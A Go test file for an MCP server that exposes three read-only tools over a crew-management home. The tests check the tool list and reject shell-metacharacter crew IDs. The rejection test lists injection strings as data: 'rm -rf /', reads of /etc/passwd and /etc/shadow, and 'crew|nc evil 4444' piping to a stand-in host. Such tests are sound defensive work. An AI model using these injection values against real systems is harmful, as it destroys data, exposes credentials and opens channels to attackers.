package crewcrtl

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	gclient "github.com/mark3labs/mcp-go/client"
	gmcp "github.com/mark3labs/mcp-go/mcp"
)

// newTestClient creates a Client pointing at the live firstmate home,
// skipping if the scripts are not present.
func newTestClient(t *testing.T) *Client {
	t.Helper()
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})
	if !exists(filepath.Join(c.scriptsDir, "fm-crew-state.sh")) {
		t.Skipf("fm-crew-state.sh not found at %s — skipping live test", c.scriptsDir)
	}
	return c
}

// inProcessClient wires the MCPServer through mcp-go's in-process transport
// for testing without a real HTTP connection.
func inProcessClient(t *testing.T, c *Client) gclient.MCPClient {
	t.Helper()
	srv := NewMCPServer(c)
	cli, err := gclient.NewInProcessClient(srv)
	if err != nil {
		t.Fatalf("NewInProcessClient: %v", err)
	}
	t.Cleanup(func() { cli.Close() })

	ctx := context.Background()
	if err := cli.Start(ctx); err != nil {
		t.Fatalf("client Start: %v", err)
	}
	initReq := gmcp.InitializeRequest{}
	initReq.Params.ProtocolVersion = gmcp.LATEST_PROTOCOL_VERSION
	initReq.Params.ClientInfo = gmcp.Implementation{Name: "test", Version: "1.0"}
	if _, err := cli.Initialize(ctx, initReq); err != nil {
		t.Fatalf("Initialize: %v", err)
	}
	return cli
}

// TestToolList_ReadOnly asserts the tool surface contains ONLY the three
// read-only tools and nothing that could mutate fleet state.
func TestToolList_ReadOnly(t *testing.T) {
	srv := NewMCPServer(NewClient(ClientConfig{FMHome: DefaultFirstMateHome}))

	tests := []struct {
		name       string
		tool       gmcp.Tool
		wantName   string
		wantDesc   string
		notAllowed string // substring that must NOT appear in the description
	}{
		{
			name:     "fleet_overview",
			wantName: "fleet_overview",
			wantDesc: "READ-ONLY",
		},
		{
			name:     "crew_state",
			wantName: "crew_state",
			wantDesc: "READ-ONLY",
		},
		{
			name:     "backlog",
			wantName: "backlog",
			wantDesc: "READ-ONLY",
		},
	}

	// Gather all registered tools from the server.
	toolsMap := srv.ListTools()
	var tools []gmcp.Tool
	for _, st := range toolsMap {
		tools = append(tools, st.Tool)
	}

	if len(tools) != 3 {
		t.Fatalf("expected 3 tools, got %d: %v", len(tools), toolNames(tools))
	}

	gotNames := make(map[string]bool)
	for _, tl := range tools {
		gotNames[tl.Name] = true

		// Assert every description says READ-ONLY.
		if !strings.Contains(tl.Description, "READ-ONLY") {
			t.Errorf("tool %q description does not say READ-ONLY: %q", tl.Name, tl.Description)
		}

		// Assert no tool name suggests mutation.
		if nameSuggestsWrite(tl.Name) {
			t.Errorf("tool %q name suggests a write operation — rejected", tl.Name)
		}
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !gotNames[tt.wantName] {
				t.Errorf("tool %q not registered", tt.wantName)
			}
		})
	}

	// Secondary guard: the full tool list must contain only read-only names.
	names := toolNames(tools)
	if containsWriteTool(names) {
		t.Errorf("tool list contains a non-read-only tool: %v", names)
	}
}

// TestToolList_ExactNames verifies the tool list is exactly the three
// expected names — no extras, no missing.
func TestToolList_ExactNames(t *testing.T) {
	srv := NewMCPServer(NewClient(ClientConfig{FMHome: DefaultFirstMateHome}))

	toolsMap := srv.ListTools()
	var tools []gmcp.Tool
	for _, st := range toolsMap {
		tools = append(tools, st.Tool)
	}

	expected := map[string]bool{
		"fleet_overview": false,
		"crew_state":     false,
		"backlog":        false,
	}
	for _, tl := range tools {
		if _, ok := expected[tl.Name]; !ok {
			t.Errorf("unexpected tool %q in surface (should only have read-only tools)", tl.Name)
		}
		expected[tl.Name] = true
	}
	for name, found := range expected {
		if !found {
			t.Errorf("expected tool %q not found in surface", name)
		}
	}
}

// TestCrewStateHandler_ShellMetacharacters verifies that crew IDs with shell
// metacharacters are rejected at the MCP handler level — the tool returns an
// error result (IsError=true) and never reaches a shell.
func TestCrewStateHandler_ShellMetacharacters(t *testing.T) {
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})
	cli := inProcessClient(t, c)

	badIDs := []string{
		"; rm -rf /",
		"`whoami`",
		"$(id)",
		"../etc/passwd",
		"crew; cat /etc/shadow",
		"crew && whoami",
		"crew|nc evil 4444",
	}

	for _, id := range badIDs {
		t.Run("id="+id, func(t *testing.T) {
			req := gmcp.CallToolRequest{
				Params: gmcp.CallToolParams{
					Name:      ToolCrewState,
					Arguments: map[string]any{"crew_id": id},
				},
			}
			result, err := cli.CallTool(context.Background(), req)
			if err != nil {
				t.Fatalf("CallTool(%q) unexpected error: %v", id, err)
			}
			if result == nil {
				t.Fatal("CallTool returned nil result")
			}
			if !result.IsError {
				t.Errorf("CallTool(%q) expected IsError=true, got false", id)
			}
			text := toolText(result)
			if !strings.Contains(text, "outside the allowed set") &&
				!strings.Contains(text, "required") {
				t.Errorf("CallTool(%q) error %q does not mention rejection", id, text)
			}
		})
	}
}

// TestCrewStateHandler_ValidID_Live verifies the handler returns real state
// data for a valid crew ID via the full MCP protocol.
func TestCrewStateHandler_ValidID_Live(t *testing.T) {
	c := newTestClient(t)
	cli := inProcessClient(t, c)

	tests := []struct {
		name       string
		crewID     string
		wantInText []string
	}{
		{
			name:       "our own crew",
			crewID:     "fc-crew-control-mcp",
			wantInText: []string{"state:", "source:"},
		},
		{
			name:       "todo-add-skill",
			crewID:     "todo-add-skill",
			wantInText: []string{"state:", "source:"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := gmcp.CallToolRequest{
				Params: gmcp.CallToolParams{
					Name:      ToolCrewState,
					Arguments: map[string]any{"crew_id": tt.crewID},
				},
			}
			result, err := cli.CallTool(context.Background(), req)
			if err != nil {
				t.Fatalf("CallTool(%q) error: %v", tt.crewID, err)
			}
			if result.IsError {
				t.Fatalf("CallTool(%q) unexpected error: %s", tt.crewID, toolText(result))
			}
			text := toolText(result)
			for _, sub := range tt.wantInText {
				if !strings.Contains(text, sub) {
					t.Errorf("output %q missing %q", text, sub)
				}
			}
		})
	}
}

// TestEndToEnd_InProcess runs the full MCP protocol (initialize, list tools,
// call each tool) through the in-process transport against the live
// firstmate home.
func TestEndToEnd_InProcess(t *testing.T) {
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})
	srv := NewMCPServer(c)

	cli, err := gclient.NewInProcessClient(srv)
	if err != nil {
		t.Fatalf("NewInProcessClient: %v", err)
	}
	t.Cleanup(func() { cli.Close() })

	ctx := context.Background()
	if err := cli.Start(ctx); err != nil {
		t.Fatalf("Start: %v", err)
	}
	initReq := gmcp.InitializeRequest{}
	initReq.Params.ProtocolVersion = gmcp.LATEST_PROTOCOL_VERSION
	initReq.Params.ClientInfo = gmcp.Implementation{Name: "test", Version: "1.0"}
	if _, err := cli.Initialize(ctx, initReq); err != nil {
		t.Fatalf("Initialize: %v", err)
	}

	// List tools — expect exactly the three read-only tools.
	toolList, err := cli.ListTools(ctx, gmcp.ListToolsRequest{})
	if err != nil {
		t.Fatalf("ListTools: %v", err)
	}
	if len(toolList.Tools) != 3 {
		t.Fatalf("expected 3 tools, got %d", len(toolList.Tools))
	}

	// Call backlog — it reads data/backlog.md directly.
	backlogReq := gmcp.CallToolRequest{
		Params: gmcp.CallToolParams{Name: ToolBacklog},
	}
	backlogResult, err := cli.CallTool(ctx, backlogReq)
	if err != nil {
		t.Fatalf("CallTool(backlog): %v", err)
	}
	if backlogResult.IsError {
		t.Fatalf("backlog returned error: %s", toolText(backlogResult))
	}
	if !strings.Contains(toolText(backlogResult), "In Flight") {
		t.Errorf("backlog output missing 'In Flight': %q", toolText(backlogResult))
	}
	if !strings.Contains(toolText(backlogResult), "Queued") {
		t.Errorf("backlog output missing 'Queued': %q", toolText(backlogResult))
	}

	// Call crew_state with a valid ID.
	stateReq := gmcp.CallToolRequest{
		Params: gmcp.CallToolParams{
			Name:      ToolCrewState,
			Arguments: map[string]any{"crew_id": "fc-crew-control-mcp"},
		},
	}
	stateResult, err := cli.CallTool(ctx, stateReq)
	if err != nil {
		t.Fatalf("CallTool(crew_state): %v", err)
	}
	if stateResult.IsError {
		t.Fatalf("crew_state returned error: %s", toolText(stateResult))
	}
	if !strings.Contains(toolText(stateResult), "state:") {
		t.Errorf("crew_state output missing 'state:': %q", toolText(stateResult))
	}

	// Call crew_state with a shell metacharacter — must be an error.
	badReq := gmcp.CallToolRequest{
		Params: gmcp.CallToolParams{
			Name:      ToolCrewState,
			Arguments: map[string]any{"crew_id": "$(whoami)"},
		},
	}
	badResult, err := cli.CallTool(ctx, badReq)
	if err != nil {
		t.Fatalf("CallTool(bad crew_state): %v", err)
	}
	if !badResult.IsError {
		t.Fatal("expected error for crew_id with shell metacharacters")
	}
}

// TestEndToEnd_FleetOverview_Live verifies the fleet_overview tool runs
// against the live scripts. It may succeed or fail (jq arg-list limit on large
// backlogs); either way it must not panic.
func TestEndToEnd_FleetOverview_Live(t *testing.T) {
	c := newTestClient(t)
	srv := NewMCPServer(c)

	cli, err := gclient.NewInProcessClient(srv)
	if err != nil {
		t.Fatalf("NewInProcessClient: %v", err)
	}
	t.Cleanup(func() { cli.Close() })

	ctx := context.Background()
	if err := cli.Start(ctx); err != nil {
		t.Fatalf("Start: %v", err)
	}
	initReq := gmcp.InitializeRequest{}
	initReq.Params.ProtocolVersion = gmcp.LATEST_PROTOCOL_VERSION
	initReq.Params.ClientInfo = gmcp.Implementation{Name: "test", Version: "1.0"}
	if _, err := cli.Initialize(ctx, initReq); err != nil {
		t.Fatalf("Initialize: %v", err)
	}

	req := gmcp.CallToolRequest{
		Params: gmcp.CallToolParams{Name: ToolFleetOverview},
	}
	result, err := cli.CallTool(ctx, req)
	if err != nil {
		t.Fatalf("CallTool(fleet_overview): %v", err)
	}
	// Accept either success (with Markdown) or an error result.
	// The critical assertion: no panic, graceful handling.
	if result.IsError {
		t.Logf("fleet_overview returned error (acceptable if the underlying script failed): %s", toolText(result))
		return
	}
	if toolText(result) == "" {
		t.Log("fleet_overview returned empty output")
	}
}

// --- helpers ---

func toolText(res *gmcp.CallToolResult) string {
	if res == nil {
		return ""
	}
	var parts []string
	for _, c := range res.Content {
		if tc, ok := c.(gmcp.TextContent); ok {
			parts = append(parts, tc.Text)
		}
	}
	return strings.Join(parts, "\n")
}

func toolNames(tools []gmcp.Tool) []string {
	names := make([]string, 0, len(tools))
	for _, t := range tools {
		names = append(names, t.Name)
	}
	return names
}
